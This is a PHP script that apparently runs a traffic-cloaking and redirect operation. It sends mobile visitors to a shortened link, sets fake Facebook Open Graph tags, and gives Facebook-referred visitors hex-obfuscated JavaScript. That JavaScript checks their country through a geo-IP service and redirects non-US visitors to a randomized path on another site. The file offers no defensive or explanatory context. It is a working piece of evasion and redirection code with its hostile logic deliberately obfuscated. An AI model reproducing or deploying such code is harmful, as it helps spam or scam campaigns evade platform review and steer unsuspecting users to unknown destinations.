<?php
ob_start();
require_once('includes/Mobile_Detect.php');
require_once('includes/Browser.php');
require_once('includes/functions.php');
require_once('config.php');
 $detect = new Mobile_Detect;
$browser = new Browser();

$mobiles =
[
"https://t.co/w4bgs4l0zU",
"https://t.co/Z26tAmC5Hx",
"https://t.co/qW5BpM1cQ8",
"https://t.co/5G4CEaTfRy",
"https://t.co/Qh6WLXLgfQ",
"https://t.co/xyzZa1V4ff",
"https://t.co/vuFQzk3R42",
"https://t.co/cvuVlnZKNR",
"https://t.co/sZTf0dPtdb",
"https://t.co/XSO9zrvKR7",
"https://t.co/mMc0MTH6uC",
"https://t.co/QzdyEv2Ujj",
"http://evaluefinance.com/turkey-suspends-islamic-moneylender-bank-asyas-exercises",
"http://evaluefinance.com/presently-the-ball-is-in-banks-court-to-take-position-against-upset-plotters-isbank-ceo",
"http://evaluefinance.com/us-family-unit-riches-surpasses-89-trillion",
"http://evaluefinance.com/uk-agent-we-encouraged-administrations-for-88000-travelers",
"http://evaluefinance.com/takata-neglected-to-report-2003-air-sack-burst-to-nhtsa",
"http://evaluefinance.com/tim-martin-destroys-brexit-fate-monger-asserts-and-says-uk-neednt-bother-with-eu-exchange-bargain",
"http://evaluefinance.com/olive-gardens-pasta-passes-offering-on-ebay-for-as-much-as-4500",
"http://evaluefinance.com/turkeys-akbank-to-get-250-million-advance-from-ifc",
"http://evaluefinance.com/tadawul-falls-1-9-as-financial-specialists-dump-stocks",
"http://evaluefinance.com/bank-of-england-holds-loan-costs-at-0-25-for-each-penny",
"http://evaluefinance.com/finance-news-you-need-to-know-today",
"http://evaluefinance.com/emaar-properties-records-750m-sukuk-on-nasdaq-dubai",
"http://evaluefinance.com/dubai-said-to-look-for-2-5bn-advances-to-back-metro-augmentation",
"http://evaluefinance.com/oil-costs-expand-increases-turkish-lira-rises",
"http://evaluefinance.com/the-yorkshire-town-where-time-has-stopped-and-is-currently-marked-down-for-20m",
"http://evaluefinance.com/nigeria-to-offer-1-billion-in-eurobonds",
"http://evaluefinance.com/what-amount-does-it-expense-to-manufacture-the-iphone-7",
"http://evaluefinance.com/powerless-us-monetary-information-hose-rate-trek-prospects",
"http://evaluefinance.com/hanoians-eating-up-da-nang-property",
"http://evaluefinance.com/abu-dhabi-financial-group-enlists-new-boss-for-specialty-unit",
"http://evaluefinance.com/eu-us-to-hold-crisp-round-of-exchange-talks-one-month-from-now",
"http://evaluefinance.com/bahrains-gulf-finance-house-gets-105m-office-from-kuwait-finance"
];


if (rand(1, 10) == 1) {

    $ads = "https://goo.gl/FekMKh";

} else {
    $ads = "https://goo.gl/FekMKh";
  // $ads = $mobiles[array_rand($mobiles)];
}
      
if($detect->isMobile() || $browser->isMobile()){
  header("Location:".$ads);
  exit();
}
      function shkronja($val){
  //abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
      $chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
      srand((double)microtime()*1000000);
      $i = 0;
      $pass = '' ;
      while ($i<=$val) 
    {
        $num  = rand() % 10;
        $tmp  = substr($chars, $num, 1);
        $pass = $pass . $tmp;
        $i++;
      }
    return $pass;
    }

echo ' 


 <meta property="og:title" content="abc" />
          <meta property="fb:app_id" content="87741124305" />';





$randval = rand();



if(strpos($_SERVER["HTTP_HOST"], $app_site) === false ){
  if (strstr($_SERVER['HTTP_REFERER'], 'facebook.com') !== false) {

  echo '

  <script>

var _0x8fa3=["\x47\x45\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x6F\x69\x70\x2E\x6E\x65\x6B\x75\x64\x6F\x2E\x63\x6F\x6D\x2F\x61\x70\x69","\x6F\x70\x65\x6E","\x73\x65\x6E\x64","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x63\x6F\x75\x6E\x74\x72\x79","\x55\x53","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","http://'.$app_site.'/","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72"];var xmlhttpz= new XMLHttpRequest();xmlhttpz[_0x8fa3[2]](_0x8fa3[0],_0x8fa3[1],false);xmlhttpz[_0x8fa3[3]]();var get=JSON[_0x8fa3[5]](xmlhttpz[_0x8fa3[4]]);var country=get[_0x8fa3[7]][_0x8fa3[6]];if(country== _0x8fa3[8]){exit}else {top[_0x8fa3[10]][_0x8fa3[9]]= _0x8fa3[11]+ Math[_0x8fa3[13]](Math[_0x8fa3[12]]()* 99999999) + "sanx0"; }  </script>';

}
    } else {

        require_once('extension.php');
    }



ob_end_flush();

?>
